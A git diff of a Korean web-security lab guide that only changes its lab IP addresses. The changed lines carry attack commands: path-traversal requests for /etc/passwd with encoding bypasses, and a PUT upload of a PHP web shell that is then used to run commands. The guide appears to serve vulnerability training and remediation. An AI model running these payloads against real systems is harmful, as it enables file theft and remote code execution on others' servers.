@@ -35,8 +35,8 @@ mermaid: true
 
 | 구분 | 내용 |
 |---|---|
-| 공격자 | Kali Linux (192.168.0.10) — curl, Burp Suite, nmap |
-| 대상 | Ubuntu + Apache/PHP (192.168.0.30) |
+| 공격자 | Kali Linux (192.168.56.10) — curl, Burp Suite, nmap |
+| 대상 | Ubuntu + Apache/PHP (192.168.56.30) |
 
 ---
 
@@ -80,15 +80,15 @@ echo "manual" | sudo tee /var/www/html/uploads/manual_02.pdf >/dev/null
 
 ```bash
 # Step 1) 정상 다운로드 — 파라미터에 파일명/경로 노출 확인
-curl -s "http://192.168.0.30/download.php?file=manual_02.pdf"
+curl -s "http://192.168.56.30/download.php?file=manual_02.pdf"
 
 # Step 2) 상대경로(../)로 시스템 파일 접근
-curl -s "http://192.168.0.30/download.php?file=../../../../../../etc/passwd"
+curl -s "http://192.168.56.30/download.php?file=../../../../../../etc/passwd"
 # → root:x:0:0:... 이 나오면 취약
 
 # Step 3) Step 2가 막히면 인코딩/치환/종단문자로 우회
-curl -s "http://192.168.0.30/download.php?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"   # URL 인코딩
-curl -s "http://192.168.0.30/download.php?file=....//....//etc/passwd"          # 특수문자 중첩
+curl -s "http://192.168.56.30/download.php?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"   # URL 인코딩
+curl -s "http://192.168.56.30/download.php?file=....//....//etc/passwd"          # 특수문자 중첩
 ```
 
 **우회 기법 정리**
@@ -144,8 +144,8 @@ HTTP에는 `GET/POST` 외에 `PUT`(파일 생성)·`DELETE`(삭제)·`TRACE`(요
 
 ```bash
 # 허용 메소드 나열
-curl -i -X OPTIONS http://192.168.0.30/ | grep -i allow
-nmap --script http-methods --script-args http-methods.test-all=true -p 80 192.168.0.30
+curl -i -X OPTIONS http://192.168.56.30/ | grep -i allow
+nmap --script http-methods --script-args http-methods.test-all=true -p 80 192.168.56.30
 ```
 
 `Allow: GET, POST, PUT, DELETE, TRACE` 처럼 위험 메소드가 보이면 점검 대상입니다.
@@ -165,19 +165,19 @@ sudo a2enconf webdav-lab && sudo systemctl restart apache2
 
 ```bash
 # Step 1) PUT 으로 웹쉘 생성 → 201 Created 면 취약
-curl -i -X PUT http://192.168.0.30/webdav/shell.php \
+curl -i -X PUT http://192.168.56.30/webdav/shell.php \
   --data '<?php system($_GET["cmd"]); ?>'
 
 # Step 2) 업로드한 웹쉘로 명령 실행
-curl "http://192.168.0.30/webdav/shell.php?cmd=id"
+curl "http://192.168.56.30/webdav/shell.php?cmd=id"
 
 # Step 3) DELETE 로 임의 파일 삭제 → 204 No Content 면 취약
-curl -i -X DELETE http://192.168.0.30/webdav/shell.php
+curl -i -X DELETE http://192.168.56.30/webdav/shell.php
 ```
 
 ```bash
 # TRACE 활성 여부 (XST) — 200 + 요청 반향이면 취약
-curl -i -X TRACE http://192.168.0.30/
+curl -i -X TRACE http://192.168.56.30/
 ```
 
 ### 2.4 조치 (서버별)
